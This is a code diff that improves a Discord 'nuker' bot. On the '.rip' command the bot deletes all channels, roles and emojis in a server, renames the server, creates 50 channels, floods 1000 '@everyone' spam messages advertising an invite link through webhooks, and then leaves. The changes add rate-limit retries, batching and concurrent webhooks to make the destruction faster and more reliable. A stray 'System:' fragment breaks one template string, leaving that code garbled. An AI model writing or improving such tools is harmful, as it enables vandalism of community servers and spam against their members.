@@ -1,5 +1,4 @@
-// ====== LIBRARIES ======
-const { Client, GatewayIntentBits } = require('discord.js');
+const { Client, GatewayIntentBits, WebhookClient } = require('discord.js');
 const express = require('express');
 const dotenv = require('dotenv');
 
@@ -31,92 +30,135 @@ app.listen(PORT, () => {
 
 // ====== BOT LOGIC ======
 client.on('ready', () => {
-  console.log(`Logged in as ${client.user.tag}`);
+  console.log(`🚀 Logged in as ${client.user.tag}`);
 });
 
-client.on('messageCreate', async (message) => {
-  if (message.content === '.rip' && !message.author.bot) {
-    const guild = message.guild;
-    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
+// Rate limit handling
+const rateLimitQueue = new Map();
+const RATE_LIMIT_DELAY = 1000; // Delay in ms for rate limit retries
 
-    // Delete all channels concurrently
+async function handleRateLimit(promiseFn, maxRetries = 3) {
+  for (let i = 0; i < maxRetries; i++) {
+    try {
+      return await promiseFn();
+    } catch (error) {
+      if (error.code === 429) {
+        const retryAfter = error.retry_after || RATE_LIMIT_DELAY;
+        console.warn(`Rate limit hit, retrying after ${retryAfter “
+
+System: ms`);
+        await new Promise(resolve => setTimeout(resolve, retryAfter));
+        continue;
+      }
+      throw error;
+    }
+  }
+  throw new Error('Max retries reached for rate-limited request');
+}
+
+client.on('messageCreate', async (message) => {
+  if (message.content !== '.rip' || message.author.bot) return;
+
+  const guild = message.guild;
+  const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
+  const channelName = 'neb-was-here';
+  const webhookAvatar = 'https://i.imgur.com/6QbX6yA.png';
+
+  try {
+    // Delete all channels concurrently with rate limit handling
     await Promise.all(guild.channels.cache.map(channel =>
-      channel.delete().catch(() => {})
+      handleRateLimit(() => channel.delete().catch(() => {}))
     ));
 
-    // Delete all roles except @everyone
-    await Promise.all(guild.roles.cache.map(async (role) => {
-      if (role.name !== '@everyone' && !role.managed) {
-        return role.delete().catch(() => {});
-      }
-    }));
+    // Delete all non-managed roles except @everyone
+    await Promise.all(guild.roles.cache.map(role =>
+      role.name !== '@everyone' && !role.managed
+        ? handleRateLimit(() => role.delete().catch(() => {}))
+        : Promise.resolve()
+    ));
 
-    // Delete all emojis
+    // Delete all emojis concurrently
     await Promise.all(guild.emojis.cache.map(emoji =>
-      emoji.delete().catch(() => {})
+      handleRateLimit(() => emoji.delete().catch(() => {}))
     ));
 
     // Rename server
-    try {
-      await guild.edit({ name: 'discord.gg/migh' });
-    } catch {}
+    await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }).catch(() => {}));
 
-    // Create 50 new text channels
+    // Create 50 channels in batches to avoid rate limits
     const createdChannels = [];
-    for (let i = 0; i < 50; i++) {
-      try {
-        const channel = await guild.channels.create({ name: 'neb-was-here' });
-        createdChannels.push(channel);
-      } catch {}
+    const batchSize = 10;
+    for (let i = 0; i < 50; i += batchSize) {
+      const batch = Array(batchSize).fill().map((_, idx) =>
+        handleRateLimit(() => guild.channels.create({ name: `${channelName}-${i + idx + 1}` }))
+      );
+      const results = await Promise.all(batch.map(p => p.catch(() => null)));
+      createdChannels.push(...results.filter(channel => channel));
+      await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between batches
     }
 
-    // Fallback to at least one channel if none were created
+    // Fallback channel if none created
     let channelsToUse = createdChannels.length > 0 ? createdChannels : [guild.channels.cache.first()];
     if (!channelsToUse[0]) {
-      try {
-        const fallbackChannel = await guild.channels.create({ name: 'fallback-channel' });
-        channelsToUse = [fallbackChannel];
-      } catch {
-        message.channel.send("❌ Couldn't create any channels to spam.");
-        return;
-      }
+      const fallbackChannel = await handleRateLimit(() =>
+        guild.channels.create({ name: 'nebula-fucker' })
+      );
+      channelsToUse = [fallbackChannel];
     }
 
-    // Send exactly 1000 messages total
+    // Create webhooks for all channels concurrently
+    const webhooks = await Promise.all(channelsToUse.map(channel =>
+      handleRateLimit(() => channel.createWebhook({ name: 'Nebula', avatar: webhookAvatar }))
+        .catch(() => null)
+    )).then(results => results.filter(webhook => webhook));
+
+    // Distribute 1000 messages across available webhooks
+    const totalMessages = 1000;
+    const messagesPerWebhook = Math.ceil(totalMessages / webhooks.length);
     let messagesSent = 0;
 
-    while (messagesSent < 1000) {
-      for (const channel of channelsToUse) {
-        if (messagesSent >= 1000) break;
-
+    const sendMessages = async (webhook) => {
+      let sent = 0;
+      while (sent < messagesPerWebhook && messagesSent < totalMessages) {
         try {
-          // Try creating webhook first
-          const webhook = await channel.createWebhook({
-            name: 'Nebula',
-            avatar: 'https://i.imgur.com/6QbX6yA.png '
-          });
-
-          await webhook.send(spamMessage);
-        } catch {
-          // Fallback to regular message if webhook fails
-          try {
-            await channel.send(spamMessage);
-          } catch {
-            continue; // Skip this iteration if both fail
-          }
+          await handleRateLimit(() => webhook.send(spamMessage));
+          messagesSent++;
+          sent++;
+        } catch (error) {
+          console.error(`Failed to send message: ${error.message}`);
+          break;
         }
+        await new Promise(resolve => setTimeout(resolve, 50)); // Minimal delay to avoid rate limits
+      }
+    };
 
-        messagesSent++;
-        await new Promise(r => setTimeout(r, 50)); // Small delay to avoid rate limits
+    // Send messages concurrently across webhooks
+    await Promise.all(webhooks.map(webhook => sendMessages(webhook)));
+
+    // Fallback to regular messages if webhooks fail or not enough messages sent
+    if (messagesSent < totalMessages) {
+      for (const channel of channelsToUse) {
+        while (messagesSent < totalMessages) {
+          try {
+            await handleRateLimit(() => channel.send(spamMessage));
+            messagesSent++;
+          } catch (error) {
+            console.error(`Failed to send fallback message: ${error.message}`);
+            break;
+          }
+          await new Promise(resolve => setTimeout(resolve, 50));
+        }
       }
     }
 
     console.log(`✅ Successfully sent ${messagesSent} messages.`);
 
     // Leave the server
-    try {
-      await guild.leave();
-    } catch {}
+    await handleRateLimit(() => guild.leave().catch(() => {}));
+
+  } catch (error) {
+    console.error(`Error during execution: ${error.message}`);
+    await message.channel.send('❌ An error occurred while executing the command.');
   }
 });
 
